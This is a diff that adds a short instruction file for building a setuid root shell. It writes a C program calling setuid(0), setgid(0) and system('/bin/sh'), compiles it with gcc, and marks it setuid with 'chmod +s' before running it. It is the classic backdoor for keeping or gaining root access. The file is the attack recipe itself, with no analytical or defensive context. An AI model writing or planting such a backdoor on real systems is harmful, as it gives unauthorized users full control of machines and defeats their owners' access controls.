@@ -1,0 +1,19 @@
+1. Create file 'rootshell.c':
+ 
+
+#include <unistd.h>
+
+int
+main(void) {
+  setuid(0);
+  setgid(0);
+
+  system("/bin/sh");
+}
+
+
+2. Compile it:
+gcc rootshell.c -o rootshell
+
+3. Run it:
+chmod +s rootshell && ./rootshell
